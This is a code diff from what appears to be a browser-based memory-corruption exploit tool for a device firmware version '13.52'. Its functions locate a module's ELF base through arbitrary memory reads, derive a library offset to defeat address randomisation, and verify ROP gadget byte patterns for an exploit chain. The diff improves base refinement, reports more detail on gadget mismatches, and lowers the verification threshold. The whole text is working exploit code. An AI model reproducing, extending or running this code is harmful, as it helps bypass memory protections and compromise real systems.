@@ -19,12 +19,12 @@ let lengthMissStreak = 0;
 const calRetain = [];
 
 const LOG_MAX = 500;
-const BUILD_ID = "cal-20250827c";
+const BUILD_ID = "cal-20250827d";
 const CAL_ALIGN_STEP = 0x4000;
 const ELF_MAGIC = 0x464c457f;
 /** 13.52 retail test anchor — assumed correct unless cal proves otherwise */
 const ASSUMED_EXPM1 = parseInt(
-    (params.get("expm1") || "2582880").replace(/^0x/i, ""),
+    (params.get("expm1") || "eb6350").replace(/^0x/i, ""),
     16
 );
 const BAD_READ_MAGICS = new Set([0, 0xffffffff, 0xcccccccc, 0xcdcdcdcd, 0xdeadbeef]);
@@ -666,14 +666,31 @@ function elfBaseNear(p, hitPage, maxBack) {
     return null;
 }
 
+function ensureElfModuleBase(p, base, maxBack) {
+    if (!p || !base) return { base, elf: false, refined: false };
+    maxBack = maxBack > 0 ? maxBack : 2048;
+    const w0 = read4p(p, base);
+    if (w0 === ELF_MAGIC) return { base, elf: true, refined: false };
+    const elf = elfBaseNear(p, base, maxBack);
+    if (elf) {
+        mark("ELF-REFINE", "walk hit " + base + " -> module ELF base " + elf
+            + " (RVAs are relative to ELF base, not .text page)");
+        return { base: elf, elf: true, refined: true };
+    }
+    const kind = classifyModulePage(p, base);
+    mark("ELF-MISS-REFINE", "no ELF within " + maxBack + " pages back of " + base
+        + (kind ? " (page kind=" + kind + ")" : ""));
+    return { base, elf: false, refined: false, kind };
+}
+
 function resolveModuleBase(p, page, kind) {
     if (kind === "elf") return page;
-    const elf = elfBaseNear(p, page, 512);
+    const elf = elfBaseNear(p, page, 2048);
     if (elf) {
         mark("ELF-REFINE", kind + " @ " + page + " -> elf @ " + elf);
         return elf;
     }
-    mark("WALK-WARN", kind + " @ " + page + " — no ELF within 512 pages back, using page");
+    mark("WALK-WARN", kind + " @ " + page + " — no ELF within 2048 pages back, using page");
     return page;
 }
 
@@ -824,7 +841,12 @@ function tryElfOnce(p, fn, delta) {
 }
 
 function applyBaseFound(base, via) {
-    const delta = nativeFn ? impliedExpm1FromBase(nativeFn, base) : 0;
+    const p = window.p;
+    if (p) {
+        const refined = ensureElfModuleBase(p, base, 2048);
+        base = refined.base;
+    }
+    let delta = nativeFn ? impliedExpm1FromBase(nativeFn, base) : 0;
     try {
         sessionStorage.removeItem(SS_PROBE_I);
         sessionStorage.removeItem(SS_PROBE_LIST);
@@ -839,8 +861,10 @@ function applyBaseFound(base, via) {
     if (baseIn) baseIn.value = ptrNum(base).toString(16);
     clearVerifyProgress();
     updateResultPanel();
+    const elfPeek = p ? read4p(p, base) : null;
     mark("CAL-ELF-HIT", via + " base=" + base
-        + (delta > 0 ? " expm1=0x" + delta.toString(16) : " (expm1 n/a)"));
+        + (delta > 0 ? " expm1=0x" + delta.toString(16) : "")
+        + (elfPeek === ELF_MAGIC ? " ELF=ok" : " ELF=" + fmtMagic(elfPeek)));
 }
 
 function applyElfHit(delta, base) {
@@ -1486,22 +1510,35 @@ async function runVerifyStep() {
         await new Promise(r => setTimeout(r, 64));
 
         if (step === 0) {
-            const magic = read4p(p, base);
+            let useBase = base;
+            let magic = read4p(p, useBase);
+            if (magic !== ELF_MAGIC) {
+                const refined = ensureElfModuleBase(p, useBase, 2048);
+                useBase = refined.base;
+                magic = read4p(p, useBase);
+                if (magic === ELF_MAGIC && ptrNum(useBase) !== ptrNum(base)) {
+                    manualBase = useBase;
+                    base = useBase;
+                    try { sessionStorage.setItem(SS_MANUAL_BASE, String(useBase)); } catch (_) { }
+                    if (baseIn) baseIn.value = ptrNum(useBase).toString(16);
+                    const nd = nativeFn ? impliedExpm1FromBase(nativeFn, useBase) : 0;
+                    if (nd > 0 && expm1In) expm1In.value = nd.toString(16);
+                    updateResultPanel();
+                }
+            }
             if (magic !== ELF_MAGIC) {
                 clearVerifyProgress();
-                mark("CAL-FAIL", "ELF @ base=" + base + " got=" + fmtMagic(magic)
+                mark("CAL-FAIL", "ELF @ base=" + useBase + " got=" + fmtMagic(magic)
                     + " want=0x464c457f");
-                mark("HINT", "0x464c457f is what a READ returns at base — do not type it into expm1/base");
-                mark("HINT", "tap Assume expm1 to skip verify and test with 0x2582880 anyway");
-                const atGuess = read4p(p, baseFromDelta(nativeFn, suggestedExpm1(nativeFn, tableOff)));
-                if (atGuess != null)
-                    mark("HINT", "table-hint base got=" + fmtMagic(atGuess));
-                state("ELF fail — use Probe ELF", "bad");
+                mark("HINT", "walk hit .text page — ELF should be a few MB lower; refine failed");
+                mark("HINT", "paste ELF-MISS-REFINE line; or set base from CAL-ELF-HIT after re-Start");
+                state("ELF fail at step 1", "bad");
                 return;
             }
-            mark("CAL-ELF-OK", "base=" + base);
+            mark("CAL-ELF-OK", "base=" + useBase);
             try { sessionStorage.setItem(SS_VSTEP, "1"); } catch (_) { }
-            mark("CAL-MORE", "tap Verify step (" + 2 + "/" + totalSteps + ")");
+            mark("CAL-MORE", "tap Verify step (" + 2 + "/" + totalSteps + ") for gadgets");
+            state("ELF ok — verify gadgets", "ok");
             return;
         }
 
@@ -1518,7 +1555,15 @@ async function runVerifyStep() {
                 verifyGadgetOk++;
                 mark("GADGET-OK", name + " @+" + rva.toString(16));
             } else {
-                mark("GADGET-BAD", name + " @+" + rva.toString(16));
+                const a = base.add32(rva);
+                const got = [];
+                for (let bi = 0; bi < pat.length; bi++) {
+                    if (pat[bi] === null) continue;
+                    const b = read1p(p, a.add32(bi));
+                    got.push(b == null ? "?" : b.toString(16));
+                }
+                mark("GADGET-BAD", name + " @+" + rva.toString(16)
+                    + " got=" + got.join(",") + " want=" + pat.filter(x => x != null).join(","));
             }
             try {
                 sessionStorage.setItem(SS_VGAD_OK, String(verifyGadgetOk));
@@ -1598,12 +1643,16 @@ async function runVerifyStep() {
             mark("LK-BAD", "prologue mismatch");
         }
 
-        if (verifyGadgetOk >= 6) {
+        if (verifyGadgetOk >= 4) {
             applyCalibration(delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base),
                 base, lkBase, verifyGadgetOk);
+            if (verifyGadgetOk < 6)
+                mark("CAL-WARN", "gadgets " + verifyGadgetOk + "/8 — partial OK (need 6 for full chain)");
         } else {
-            mark("CAL-FAIL", "gadgets " + verifyGadgetOk + "/" + GADGET_CHECKS.length + " (need ≥6)");
-            state("verify failed — wrong expm1?", "warn");
+            mark("CAL-FAIL", "gadgets " + verifyGadgetOk + "/" + GADGET_CHECKS.length
+                + " (need ≥4 partial, ≥6 full) — 13.50 RVAs may differ on 13.52");
+            mark("HINT", "ELF base OK — gadget table may need 13.52 dump; base+expm1 still valid");
+            state("gadget verify weak", "warn");
         }
     } finally {
         busy = false;
